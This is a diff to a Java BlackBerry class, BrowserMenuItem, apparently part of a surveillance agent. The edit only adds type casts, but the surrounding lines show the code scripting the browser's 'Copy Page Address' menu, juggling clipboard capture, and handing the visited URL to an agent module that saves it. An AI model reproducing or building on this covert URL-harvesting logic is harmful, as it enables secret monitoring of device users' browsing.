@@ -71,9 +71,9 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             if (Device.getInstance().atLeast(6, 0)) {
                 boolean ret = MenuWalker.walk("Copy Page Address");
                 if (ret) {
-                    ModuleClipboard.getInstance().suspendClip();
+                    ((ModuleClipboard)ModuleClipboard.getInstance()).suspendClip();
                     String url = (String) Clipboard.getClipboard().get();
-                    ModuleClipboard.getInstance().setClip(url);
+                    ((ModuleClipboard)ModuleClipboard.getInstance()).setClip(url);
                     if (url != null) {
                         //#ifdef DEBUG
                         debug.trace("run, 6.0, URL FOUND:" + url);
@@ -166,7 +166,7 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             //#endif
 
             if (agent == null) {
-                agent = ModuleUrl.getInstance();
+                agent = (ModuleUrl) ModuleUrl.getInstance();
             }
 
             agent.saveUrl(url);
